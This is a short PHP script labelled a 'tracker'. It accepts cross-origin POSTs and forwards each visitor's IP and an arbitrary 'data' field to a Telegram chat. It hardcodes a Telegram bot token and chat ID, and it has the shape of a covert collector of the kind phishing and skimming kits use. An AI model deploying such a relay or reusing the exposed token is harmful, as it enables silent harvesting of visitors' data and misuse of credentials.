<?php
/* 🔱 ZETA SYSTEM TRACKER V12 */
session_start();
header("Access-Control-Allow-Origin: *");
date_default_timezone_set('America/La_Paz');

$token = "8474739152:AAF8T6-YIonvsmwe6Oc2BX5ePwdLZnwbCAE";
$admin_id = "7621351319";

function getIP() { 
    return $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR']; 
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = getIP();
    $data = $_POST['data'] ?? 'Sin datos';
    
    // FILTRO ANTI-SPAM (Evita mensajes repetidos en 2 segundos)
    if (isset($_SESSION['last_msg']) && (time() - $_SESSION['last_msg'] < 2)) { exit; }
    $_SESSION['last_msg'] = time();

    $msg = "⚡ *ACTIVIDAD ZETA DETECTADA*\n👤 Cliente IP: `{$ip}`\n📝 Acción: `{$data}`\n⏰ Hora: " . date('H:i:s');
    
    // ENVIAR A TELEGRAM
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$admin_id&text=" . urlencode($msg) . "&parse_mode=Markdown";
    @file_get_contents($url);
}
?>
